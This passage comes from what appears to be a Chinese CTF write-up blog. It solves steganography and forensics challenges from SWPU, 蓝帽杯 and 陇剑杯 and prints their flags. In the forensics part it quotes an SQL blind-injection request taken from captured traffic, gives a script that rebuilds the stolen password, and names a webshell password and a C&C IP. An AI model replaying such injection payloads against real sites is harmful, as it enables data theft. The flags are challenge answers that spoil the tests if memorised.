alt="跳舞的小人对应表"></p><p>解密得到</p><pre class="line-numbers language-none"><code class="language-none">iloveholmesandwllm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-漂流记的马里奥"><a href="#SWPU-2019-漂流记的马里奥" class="headerlink" title="[SWPU 2019]漂流记的马里奥"></a>[SWPU 2019]漂流记的马里奥</h1><p>题目给的是一个exe文件，双击运行会创建1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271956089.png" alt="image-20230827195658049"></p><p><img src="https://imag.keyblue.cn/imag/202308271957280.png" alt="image-20230827195710245"></p><p>使用010打开文件，发现末尾是个rar压缩包以及ntfs和flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271959190.png" alt="image-20230827195901155"></p><p>在cmd中使用<code>dir /r</code>命令可以发现<code> 1.txt:flag.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308272104590.png" alt="image-20230827210410554"></p><p>最后使用<code>notepad 1.txt:flag.txt</code>可以查看隐藏的内容</p><p><img src="https://imag.keyblue.cn/imag/202308272105464.png" alt="image-20230827210502434"></p><p>得到flag值swupctf{ddg_is_cute}</p><h1 id="SWPU-2019-神奇的二维码"><a href="#SWPU-2019-神奇的二维码" class="headerlink" title="[SWPU 2019]神奇的二维码"></a>[SWPU 2019]神奇的二维码</h1><p>使用<code>foremost -i MISC-神奇的二维码-BitcoinPay.png</code>未分离出内容</p><p><img src="https://imag.keyblue.cn/imag/202308271014365.png" alt="foremost分离"></p><p>使用<code>binwalk -e *.png --run-as=root</code>分离出多个rar压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308271016763.png" alt="image-20230827101620731"></p><p><img src="https://imag.keyblue.cn/imag/202308271019800.png" alt="image-20230827101958767"></p><ul><li><p>解密<code>flag.doc</code>中的内容，得到<code>comEON_YOuAreSOSoS0great</code>，据测试是<code>18394.rar</code>的密码，解开压缩包得到<code>good.mp3</code></p></li><li><p>解密<code>encode.txt</code>中的内容得到<code>asdfghjkl1234567890</code>，据测试是<code>看看flag在不在里面^_^.rar</code> 的密码，解开压缩包得到<code>flag.jpg</code></p></li></ul><p>使用<code>Audacity64.exe</code>打开<code>good.mp3</code>发现是莫斯电码，记录得到</p><pre class="line-numbers language-none"><code class="language-none">-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--解码后：morseisveryveryeasy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>提交flag</p><h1 id="SWPU-2020-套娃"><a href="#SWPU-2020-套娃" class="headerlink" title="[SWPU 2020]套娃"></a>[SWPU 2020]套娃</h1><p>使用<code>binwalk</code>分离文件</p><p><img src="https://imag.keyblue.cn/imag/202308271106253.png" alt="image-20230827110617216"></p><p>分离出一个压缩包内含两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271109438.png" alt="image-20230827110902406"></p><p>打开txt文件发现内部是rc4密文<code>U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p</code>，需要找到key</p><p><img src="https://imag.keyblue.cn/imag/202308271110484.png" alt="image-20230827111004446"></p><p>对swpu.xls解压，内部含有两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271112716.png" alt="image-20230827111208681"></p><p>解压rc4key.zip需要密码，esayrc4.xlsx无法再次解压，随即使用010打开查看，</p><p><img src="https://imag.keyblue.cn/imag/202308271114279.png" alt="image-20230827111437244"></p><p>拉到最后，发现密码为<code>6e4c834d77cba03af41e1562a5bce84e</code></p><p>使用在在线解密工具得到明文为<code>ef1a73d40977a49b99b871980f355757</code></p><p><img src="https://imag.keyblue.cn/imag/202308271116714.png" alt="image-20230827111624674"></p><h1 id="SWPU-2020-找找吧"><a href="#SWPU-2020-找找吧" class="headerlink" title="[SWPU 2020]找找吧"></a>[SWPU 2020]找找吧</h1><p>题目的附件需要解压密码</p><p><img src="https://imag.keyblue.cn/imag/202308280843443.png" alt="image-20230828084348396"></p><p>使用binwalk分离无果</p><p>使用foremost分离无果</p><p>使用010打开附件，直接拉到最后，发现了key</p><p><img src="https://imag.keyblue.cn/imag/202308280851443.png" alt="image-20230828085125413"></p><p>压缩包内有一个mp3文件和一个压缩包，mp3文件使用Audacity打开，在音频的最后发现了像摩斯密码的内容</p><p><img src="https://imag.keyblue.cn/imag/202308280856684.png" alt="image-20230828085623626"></p><p><img src="https://imag.keyblue.cn/imag/202308280857191.png" alt="image-20230828085729160"></p><p>记录得到</p><pre class="line-numbers language-none"><code class="language-none">-.. ....- ...-- ----. -.... ...-- . ----. ..--- -... ----- .---- ..--- .- .- -...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码得到</p><pre class="line-numbers language-none"><code class="language-none">d43963e92b012aab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用此字符串做压缩包密码，显示密码错误。</p><p>猜测可能是md5值，随机在线解密。得到明文</p><pre class="line-numbers language-none"><code class="language-none">n1ce_try<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线解密网站：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="https://imag.keyblue.cn/imag/202308280908162.png" alt="image-20230828090823133"></p><p>解压缩得到两张图片</p><p><img src="https://imag.keyblue.cn/imag/202308280913593.png" alt="image-20230828091328566"></p><p>将gif图片使用movgear-gif打开，看到某一帧带有一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308280917493.png" alt="image-20230828091736418"></p><p>识别到flag值</p><p><img src="https://imag.keyblue.cn/imag/202308280918288.png" alt="image-20230828091825248"></p><p>随即提交但是错误</p><p>似乎是凯撒密码，批量解密</p><p><img src="https://imag.keyblue.cn/imag/202308280955841.png" alt="image-20230828095511800"></p><p>得到flag值：sWpu_N1c3_Try</p><h1 id="SWPU-2020-耗子尾汁"><a href="#SWPU-2020-耗子尾汁" class="headerlink" title="[SWPU 2020]耗子尾汁"></a>[SWPU 2020]耗子尾汁</h1><p>上来先分离试试</p><p><img src="https://imag.keyblue.cn/imag/202308301022883.png" alt="image-20230830102234837"></p><p>打开其中一个压缩包，里面有flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308301023182.png" alt="image-20230830102319142"></p><p>这是一个错误的flag</p><p>在另一个压缩包含有一个视频文件</p><p><img src="https://imag.keyblue.cn/imag/202308301024886.png" alt="image-20230830102414856"></p><p>看来是个视频隐写</p><p>播放视频，暂停看到一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308301025784.png" alt="image-20230830102550742"></p><p><code>c2lnbl9pbg==</code></p><p>使用工具解码<img src="https://imag.keyblue.cn/imag/202308301027011.png" alt="image-20230830102755978"></p><p>将视频再次分离</p><p><img src="https://imag.keyblue.cn/imag/202308301030639.png" alt="image-20230830103023591"></p><p>得到一个压缩包需要密码才能解压</p><p>于是把刚刚解码得到的字符串作为密码解压</p><p>打开解压后的文本文档</p><p><img src="https://imag.keyblue.cn/imag/202308301032566.png" alt="image-20230830103225517"></p><p>翻译注释：The last layer is the single table replacement password（ 最后一层是单表替换密码  ）</p><p>原密文为</p><pre class="line-numbers language-none"><code class="language-none">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解压一次得到</p><pre class="line-numbers language-none"><code class="language-none">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32解码一次得到</p><pre class="line-numbers language-none"><code class="language-none">6C76756569616B7875647379716568737A7168796B67677379796C6B767669<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ASCII解码得到</p><pre class="line-numbers language-none"><code class="language-none">lvueiakxudsyqehszqhykggsyylkvvi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仿射密码解码得到</p><pre class="line-numbers language-none"><code class="language-none">flagyouhavesignedinsuccessfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到文本文件的文件名为19_20，仿射密码a和b的值也为19_20</p><p><img src="https://imag.keyblue.cn/imag/202308301101298.png" alt="image-20230830110155260"></p><p><img src="https://imag.keyblue.cn/imag/202308301102498.png" alt="image-20230830110213462"></p><p>需要注意的是经过仿射密码得到的字符串不能直接提交</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;you_have_signed_in_successfully&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-新生赛-gif好像有点大"><a href="#SWPUCTF-2021-新生赛-gif好像有点大" class="headerlink" title="[SWPUCTF 2021 新生赛]gif好像有点大"></a>[SWPUCTF 2021 新生赛]gif好像有点大</h1><p>使用foremost和binwalk分离文件无果</p><p>010打开文件也没有发现什么有用的信息</p><p>随即使用Stegsolve.jar打开gif，选择frame browser模式</p><p><img src="https://imag.keyblue.cn/imag/202308271701553.png" alt="image-20230827170114514"></p><p>一个一共800多帧，在562帧发现一个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308271704355.png" alt="image-20230827170409299"></p><p>使用微信或者<code>QR Research</code>扫码</p><p><img src="https://imag.keyblue.cn/imag/202308271703623.png?x-image-process=style/style-d277" alt="image-20230827170317585"></p><p>得到flag值为NSS{The_G1F_ls_T00_b1g}</p><h1 id="SWPUCTF-2021-新生赛-zipbomb"><a href="#SWPUCTF-2021-新生赛-zipbomb" class="headerlink" title="[SWPUCTF 2021 新生赛]zipbomb"></a>[SWPUCTF 2021 新生赛]zipbomb</h1><p>题目说不要解压压缩包</p><p>我们用7z打开压缩包查看，没有发现</p><p><img src="https://imag.keyblue.cn/imag/202309021600258.png" alt="image-20230902160017196"></p><p>使用binwalk分析文件，发现还有一个压缩包</p><p><img src="https://imag.keyblue.cn/imag/202309021604707.png" alt="image-20230902160430677"></p><p>随即，binwalk分离文件需要手动暂停，不然会把所有文件对分离出来</p><p><img src="https://imag.keyblue.cn/imag/202309021606526.png" alt="image-20230902160636502"></p><p><img src="https://imag.keyblue.cn/imag/202309021606351.png" alt="image-20230902160648311"></p><p>也可使用foremost分离，无需手动暂停</p><p><img src="https://imag.keyblue.cn/imag/202309021607443.png" alt="image-20230902160728420"></p><p>打开第二个压缩包即是flah文件</p><p><img src="https://imag.keyblue.cn/imag/202309021608078.png" alt="image-20230902160832034"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;Z1p_B00m_d1sp0sal&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-新生赛-原来你也玩原神"><a href="#SWPUCTF-2021-新生赛-原来你也玩原神" class="headerlink" title="[SWPUCTF 2021 新生赛]原来你也玩原神"></a>[SWPUCTF 2021 新生赛]原来你也玩原神</h1><p>压缩包解压错误</p><p>拖到kaili进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308310952535.png" alt="image-20230831095217476"></p><p>什么也没分离出来</p><p>kali显示文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308311013762.png" alt="image-20230831101327721"></p><p>发现是mp3格式文件</p><p>将文件后缀改为mp3，用Audacity打开</p><p><img src="https://imag.keyblue.cn/imag/202308311015777.png" alt="image-20230831101534739"></p><p>没有发现音频隐写</p><p>随即使用MP3Stego解码</p><p><img src="https://imag.keyblue.cn/imag/202308311016529.png" alt="image-20230831101640493"></p><p>打开分析出来的txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308311017165.png" alt="image-20230831101725129"></p><pre class="line-numbers language-none"><code class="language-none">504b 0304 1400 0900 0800 6db2 3c53 16020d75 3600 0000 7902 0000 0800 0000 74657374 2e74 7874 edc4 410a 0010 1005 d0c32976 3663 ff9b a428 8cc2 4272 7797 b0f416cf 1229 a7ff ffb7 6f12 2c99 e0dc 052df382 09b5 c754 914a 633f ce05 504b 01023f00 1400 0000 0800 6db2 3c53 1602 0d753600 0000 7902 0000 0800 2400 0000 00000000 2000 0000 0000 0000 7465 7374 2e747874 0a00 2000 0000 0000 0100 1800 054d41d7 73b4 d701 a780 52db 73b4 d701 cfdcaa53 73b4 d701 504b 0506 0000 0000 01000100 5a00 0000 5c00 0000 0000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308311019735.png" alt="image-20230831101949700"></p><p>发现是个zip压缩包，zip的文件头是<code>504b 0304</code></p><p>压缩包需要密码才能打开，猜测是个伪加密，改09为00</p><p><img src="https://imag.keyblue.cn/imag/202308311022721.png" alt="image-20230831102223698"></p><p>成功打开压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308311023070.png" alt="image-20230831102310035"></p><p>flag：</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;So_you_also_play_Genshin_impact&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-新生赛-我flag呢？"><a href="#SWPUCTF-2021-新生赛-我flag呢？" class="headerlink" title="[SWPUCTF 2021 新生赛]我flag呢？"></a>[SWPUCTF 2021 新生赛]我flag呢？</h1><p>打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311317637.png" alt="image-20230831131708601"></p><p>词频统计</p><pre class="line-numbers language-none"><code class="language-none">from collections import Counterimport reflag &#x3D; &#39;&#39;with open(&#39;res&#x2F;附件.txt&#39;, &#39;r&#39;) as f:    for line in f:        text &#x3D; linetext &#x3D; re.findall(&quot;&#123;(.*?)&#125;&quot;, text)for i in text:    flag +&#x3D; iwordcount &#x3D; Counter(flag.lower())wordcount &#x3D; wordcountprint(wordcount)for i in wordcount:    print(i[0], end&#x3D;&#39;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是，题目给的文本是两行，我们把两行合并成一行保存后再运行脚本</p><p>运行脚本</p><p><img src="https://imag.keyblue.cn/imag/202308311343946.png" alt="image-20230831134334915"></p><pre class="line-numbers language-none"><code class="language-none">yourflagis81e57d2bc90364t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为t只出现了一次</p><p>所以最后的flag为</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;81e57d2bc90364&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="UTCTF-2020-Zero"><a href="#UTCTF-2020-Zero" class="headerlink" title="[UTCTF 2020]Zero"></a>[UTCTF 2020]Zero</h1><p>是零宽隐写</p><p><img src="https://imag.keyblue.cn/imag/202309011406892.png" alt="image-20230901140656857"></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽隐写在线解密</a></p><p>将文本复制到网站解密即可</p><p><img src="https://imag.keyblue.cn/imag/202309011406263.png" alt="image-20230901140642209"></p><pre class="line-numbers language-none"><code class="language-none">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="羊城杯-2021-Baby-Forenisc"><a href="#羊城杯-2021-Baby-Forenisc" class="headerlink" title="[羊城杯 2021]Baby_Forenisc"></a>[羊城杯 2021]Baby_Forenisc</h1><p>查看历史命令</p><p><img src="https://imag.keyblue.cn/imag/202309041542425.png" alt="image-20230904154233373"></p><p>由历史命令可知，flag和git有关</p><p>查看ie</p><p><img src="https://imag.keyblue.cn/imag/202309041455659.png" alt="image-20230904145506659"></p><p> 查找ssh.txt文件</p><p><img src="https://imag.keyblue.cn/imag/202309041502213.png" alt="image-20230904150218179"></p><p>保存文件</p><p><img src="https://imag.keyblue.cn/imag/202309041505277.png" alt="image-20230904150504247"></p><p>base64解码保存的文件</p><p><img src="https://imag.keyblue.cn/imag/202309041510800.png" alt="image-20230904151044768"></p><p>发现了一个QQ邮箱</p><pre class="line-numbers language-none"><code class="language-none">song552085107@qq.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用github搜索用户</p><p><img src="https://imag.keyblue.cn/imag/202309041604232.png" alt="image-20230904160428206"></p><p>在这个人的仓库里找到<code>__APP__</code>下载查看</p><p>用010打开文件，选择text模式</p><p><img src="https://imag.keyblue.cn/imag/202309041603994.png" alt="image-20230904160316948"></p><p>在2169行找到了一行base64编码，解码得到flag</p><p><img src="https://imag.keyblue.cn/imag/202309041606307.png" alt="image-20230904160642272"></p><pre class="line-numbers language-none"><code class="language-none">SangFor&#123;S0_3azy_2_crack_noob_player&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="蓝帽杯-2022-初赛-网站取证"><a href="#蓝帽杯-2022-初赛-网站取证" class="headerlink" title="[蓝帽杯 2022 初赛]网站取证"></a>[蓝帽杯 2022 初赛]网站取证</h1><pre class="line-numbers language-none"><code class="language-none">据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><pre class="line-numbers language-none"><code class="language-none">请从网站源码中找出木马文件，并提交木马连接的密码。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开压缩包，是网站的根目录备份压缩包和sql备份文件。</p><p>我们直接解压压缩包，被火绒查杀出一个webshell</p><p><img src="https://imag.keyblue.cn/imag/202308301443483.png" alt="image-20230830144300440"></p><p>那么题目需要的木马文件应该就是它了</p><p>我们打开该文件</p><p><img src="https://imag.keyblue.cn/imag/202308301445852.png" alt="image-20230830144554819"></p><p>连接密码是</p><pre class="line-numbers language-none"><code class="language-none">lanmaobei666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><pre class="line-numbers language-none"><code class="language-none">请提交数据库连接的明文密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过Seqy源码审计系统全局搜索password</p><p><img src="https://imag.keyblue.cn/imag/202308301503765.png" alt="image-20230830150325734"></p><p>点开第一个database.0.php,发现数据库用户名明文显示在此文件内，同时看到密码是由my_encrypt()函数决定的</p><p><img src="https://imag.keyblue.cn/imag/202308301504821.png" alt="image-20230830150448782"></p><p>追踪到my_encrypt()函数所在的文件</p><p><img src="https://imag.keyblue.cn/imag/202308301507686.png" alt="image-20230830150735660"></p><p>我们搭建一个php环境运行一下这个文件，同时输出密码</p><p><img src="https://imag.keyblue.cn/imag/202308301541360.png" alt="image-20230830154140311"></p><p><img src="https://imag.keyblue.cn/imag/202308301541375.png" alt="image-20230830154159345"></p><p>需要注意的是php环境版本不能高于7.1。因为代码中使用的mcrypt_module_open()函数在7.2版本被弃用了</p><p>明文密码为</p><pre class="line-numbers language-none"><code class="language-none">KBLT123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><pre class="line-numbers language-none"><code class="language-none">请提交数据库金额加密混淆使用的盐值。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>全局搜索key</p><p><img src="https://imag.keyblue.cn/imag/202308301548623.png" alt="image-20230830154830593"></p><p>第一项内容似乎就是问题提到的盐值</p><p><img src="https://imag.keyblue.cn/imag/202308301549256.png" alt="image-20230830154947229"></p><p><em>题主似乎在说加盐最狗</em>🤣</p><p>盐值为</p><pre class="line-numbers language-none"><code class="language-none">jyzg123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问4"><a href="#问4" class="headerlink" title="问4"></a>问4</h2><pre class="line-numbers language-none"><code class="language-none">请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？（换算比例请从数据库中获取，答案参考格式：123.45）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放着别做了😂浪费时间</p><h1 id="蓝帽杯-2022-初赛-计算机取证"><a href="#蓝帽杯-2022-初赛-计算机取证" class="headerlink" title="[蓝帽杯 2022 初赛]计算机取证"></a>[蓝帽杯 2022 初赛]计算机取证</h1><pre class="line-numbers language-none"><code class="language-none">现对一个windows计算机进行取证，请您对以下问题进行分析解答。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问1-1"><a href="#问1-1" class="headerlink" title="问1"></a>问1</h2><pre class="line-numbers language-none"><code class="language-none">从内存镜像中获得taqi7的开机密码是多少？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309011513162.png" alt="image-20230901151036671"></p><p>密文：<code>7f21caca5685f10d9e849cc84c340528</code></p><pre class="line-numbers language-none"><code class="language-none">anxinqi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问2-1"><a href="#问2-1" class="headerlink" title="问2"></a>问2</h2><pre class="line-numbers language-none"><code class="language-none">制作该内存镜像的进程Pid号是多少？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MagnetRAMCaptu是制作镜像制作工具</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309021419123.png" alt="image-20230902141951071"></p><p>所以进程号是2192</p><pre class="line-numbers language-none"><code class="language-none">2192<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问3-1"><a href="#问3-1" class="headerlink" title="问3"></a>问3</h2><pre class="line-numbers language-none"><code class="language-none">bitlokcer分区某office文件中存在的flag值为？（答案参考格式：NSSCTF&#123;abcABC123&#125;）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Bitlocker是windows系统的加密分区</p><h1 id="陇剑杯-2021-ios"><a href="#陇剑杯-2021-ios" class="headerlink" title="[陇剑杯 2021]ios"></a>[陇剑杯 2021]ios</h1><pre class="line-numbers language-none"><code class="language-none">一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问1-2"><a href="#问1-2" class="headerlink" title="问1"></a>问1</h2><pre class="line-numbers language-none"><code class="language-none">黑客所控制的C&amp;C服务器IP是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开压缩包是三个文件</p><p><img src="https://imag.keyblue.cn/imag/202308311527682.png" alt="image-20230831152757660"></p><p>打开wireshark，在第 15 TCP流有重要明文信息</p><p><img src="https://imag.keyblue.cn/imag/202308311549622.png" alt="image-20230831154955567"></p><p>可以看到IP暴露</p><pre class="line-numbers language-none"><code class="language-none">3.128.156.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问2-2"><a href="#问2-2" class="headerlink" title="问2"></a>问2</h2><pre class="line-numbers language-none"><code class="language-none">黑客利用的Github开源项目的名字是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图，github链接</p><p><img src="https://imag.keyblue.cn/imag/202308311553117.png" alt="image-20230831155305065"></p><pre class="line-numbers language-none"><code class="language-none">stowaway<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问3-2"><a href="#问3-2" class="headerlink" title="问3"></a>问3</h2><pre class="line-numbers language-none"><code class="language-none">通讯加密密钥的明文是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图</p><p><img src="https://imag.keyblue.cn/imag/202308311556187.png" alt="image-20230831155633134"></p><pre class="line-numbers language-none"><code class="language-none">hack4sec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问4-1"><a href="#问4-1" class="headerlink" title="问4"></a>问4</h2><pre class="line-numbers language-none"><code class="language-none">黑客通过SQL盲注拿到了一个敏感数据，内容是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一问考察的是tls流量的解密，需要用到题目提供的<code>keylog.txt</code></p><p>首先打开首选项</p><p><img src="https://imag.keyblue.cn/imag/202308311602210.png" alt="image-20230831160231166"></p><p>点开Protocols，找到TLS</p><p><img src="https://imag.keyblue.cn/imag/202308311604558.png" alt="image-20230831160450529"></p><p>选择keylog.txt然后确定即可</p><p><img src="https://imag.keyblue.cn/imag/202308311605730.png" alt="image-20230831160517709"></p><p>筛选HTTP2</p><p><img src="https://imag.keyblue.cn/imag/202308311606961.png" alt="image-20230831160659905"></p><p>查找select字符串</p><p><img src="https://imag.keyblue.cn/imag/202308311923959.png" alt="image-20230831192314908"></p><p>对其中一条进行URL解码</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;info?l&#x3D;1&amp;o&#x3D;(case_when_(select_hex(substr(password,1,1))_from_user)&#x3D;&quot;2D&quot;_then_id_else_col1_end)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选中开始盲注到盲注结束的包</p><p><img src="https://imag.keyblue.cn/imag/202308311931734.png" alt="image-20230831193146679"></p><p>选择导出为纯文本</p><p><img src="https://imag.keyblue.cn/imag/202308311932924.png" alt="image-20230831193209892"></p><p>选择查询的包和取消勾选packet details</p><p><img src="https://imag.keyblue.cn/imag/202308311933572.png" alt="image-20230831193342543"></p><p>导出后</p><p><img src="https://imag.keyblue.cn/imag/202308311934755.png" alt="image-20230831193427695"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> reflag <span class="token operator">=</span> <span class="token string">''</span>num_old <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/triffi.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(application/json)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'o=%28case_when_%28select_hex%28substr%28password'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%2C(.*?)%2C1%29%29"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> num <span class="token operator">></span> num_old<span class="token punctuation">:</span>                num_old <span class="token operator">=</span> num                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            var <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"user%29%3D%22(.*?)%22"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308311955152.png" alt="image-20230831195536119"></p><p>得到敏感数据</p><pre class="line-numbers language-none"><code class="language-none">746558f3-c841-456b-85d7-d6c0f2edabb2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问5"><a href="#问5" class="headerlink" title="问5"></a>问5</h2><pre class="line-numbers language-none"><code class="language-none">黑客端口扫描的扫描器的扫描范围是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择分析-专家信息</p><p><img src="https://imag.keyblue.cn/imag/202309010944060.png" alt="image-20230901094440035"></p><p>取消勾选过滤器的限制</p><p><img src="https://imag.keyblue.cn/imag/202309010945115.png" alt="image-20230901094518082"></p><p>打开RST</p><p><img src="https://imag.keyblue.cn/imag/202309010945028.png" alt="image-20230901094547982"></p><p>如图，从10开始</p><p><img src="https://imag.keyblue.cn/imag/202309010946551.png" alt="image-20230901094634504"></p><p>扫到499号端口结束</p><p><img src="https://imag.keyblue.cn/imag/202309010947537.png" alt="image-20230901094721486"></p><p>此外，打开统计-会话</p><p><img src="https://imag.keyblue.cn/imag/202309011038297.png" alt="image-20230901103807273"></p><p>选择TCP，并对端口进行排序，可以看到端口的规律</p><p><img src="https://imag.keyblue.cn/imag/202309011038141.png" alt="image-20230901103851115"></p><p>这样也可以得到扫描的端口</p><pre class="line-numbers language-none"><code class="language-none">10-499<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问6"><a href="#问6" class="headerlink" 